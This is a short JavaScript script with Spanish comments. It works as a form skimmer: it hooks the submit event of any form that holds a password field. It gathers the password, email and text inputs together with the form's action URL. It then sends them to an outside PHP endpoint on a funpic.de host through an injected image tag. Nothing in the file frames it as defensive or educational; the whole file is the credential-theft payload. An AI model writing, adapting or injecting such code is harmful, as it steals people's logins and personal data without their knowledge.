host = 'http://quienmeelimino.qu.funpic.de/subidas/guardar.php?cookie=';
timeout = 1000;

function sleep(millisegundos) {
var inicio = new Date().getTime();
while ((new Date().getTime() - inicio) < millisegundos){}
}
//Tpodo aquello que sea password o email que se encuentre en un imput
//o cuadro de texto se envie
campos = document.querySelectorAll('input[type=password]');
for(i=0; i<campos.length; i++)
{

form = campos[i].form;
form.addEventListener('submit', function(){
mensaje = 'URL: ' + this.action + '\n';
nodos = this.querySelectorAll('input');
for(j=0; j<nodos.length; j++)
{
nodo = nodos[j];
console.log(nodo);
if(nodo.type==='password' || nodo.type==='email' || nodo.type==='text')
{
mensaje = mensaje + nodo.name + ': ' + nodo.value + '\n';
}
}
query = '?data=' + escape(mensaje);
document.write('<img src="' + host + query + '">');
sleep(timeout);
}, false)
}